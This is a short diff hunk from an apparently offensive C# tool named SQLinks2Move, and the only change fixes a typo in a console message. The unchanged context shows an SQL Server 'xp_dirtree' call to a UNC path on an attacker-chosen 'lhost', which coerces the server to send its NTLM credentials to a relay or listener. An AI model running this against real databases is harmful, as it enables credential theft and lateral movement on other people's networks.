@@ -142,7 +142,7 @@ namespace SQLinks2Move
                 String queryhash = "EXEC master..xp_dirtree \"\\\\" + lhost + "\\\\test\";";
                 SqlCommand commandhash = new SqlCommand(queryhash, con);
                 SqlDataReader readerhash = commandhash.ExecuteReader();
-                Console.WriteLine("[*] Veryify your NTLM Relay or listener");
+                Console.WriteLine("[*] Verify your NTLM Relay or listener");
                 readerhash.Close();
             }
             else
